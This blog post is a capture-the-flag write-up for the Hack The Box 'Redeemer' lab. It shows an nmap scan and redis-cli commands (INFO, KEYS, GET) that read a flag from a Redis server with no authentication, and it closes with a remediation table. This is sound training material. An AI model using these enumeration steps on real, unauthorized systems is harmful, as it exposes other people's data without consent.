---
layout: post
title: "HTB Starting Point — Redeemer: Unauthenticated Redis"
date: 2026-06-30 15:00:00 -0700
categories: [htb, starting-point]
tags: [redis, database, unauthenticated, enumeration, misconfiguration]
---

First box of **Tier 1** — and a step up from the Tier 0 file services
([Meow]({% post_url 2026-06-30-htb-starting-point-meow %}),
[Fawn]({% post_url 2026-06-30-htb-starting-point-fawn %}),
[Dancing]({% post_url 2026-06-30-htb-starting-point-dancing %})). Redeemer swaps the
service for a **database**, but the lesson rhymes: an unauthenticated data store on the
network gives up its contents to anyone who connects.

> **Difficulty:** Very Easy · **OS:** Linux · **Key idea:** Redis exposed with no
> authentication.

## 1. Recon

```bash
nmap -Pn -sV -p 6379 -T4 -oN nmap_initial.txt 10.129.x.x
```

```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

One service: **Redis 5.0.7** on port **6379**. Redis is an in-memory key-value database —
fast, and by default (in older setups) it ships with **no authentication** and can be
reachable from the network.

## 2. Enumerate with `redis-cli`

The native client is `redis-cli` (install via `redis` / `redis-tools`). Connect and check
whether auth is even required:

```bash
redis-cli -h 10.129.x.x INFO server
```

It answered without asking for a password — **unauthenticated access confirmed.** Now list
the keys in the database:

```bash
redis-cli -h 10.129.x.x KEYS '*'
```

```
temp
numb
stor
flag
```

A key named **`flag`** — subtle.

## 3. Loot

```bash
redis-cli -h 10.129.x.x GET flag
# -> [REDACTED — 32-char hash]
```

Machine owned. No exploit, no shell — just an open database answering questions it
shouldn't from an anonymous client.

## 4. Why it worked & how to fix it

| Root cause | Remediation |
|---|---|
| Redis reachable from the network | Bind to `127.0.0.1` / restrict with a firewall |
| No authentication (`requirepass` unset) | Set a strong `requirepass`; enable ACLs (Redis 6+) |
| Protected mode off / default config | Enable `protected-mode`; don't expose datastores publicly |

## Tier 1, box 1

Same core lesson as Tier 0 — **a networked service with no authentication is a free
door** — now applied to a database. The method didn't change: `nmap` to find the service,
the service's own client to enumerate it, then read what a missing auth check left open.

*Performed in a legal, authorized environment (HTB Starting Point).*
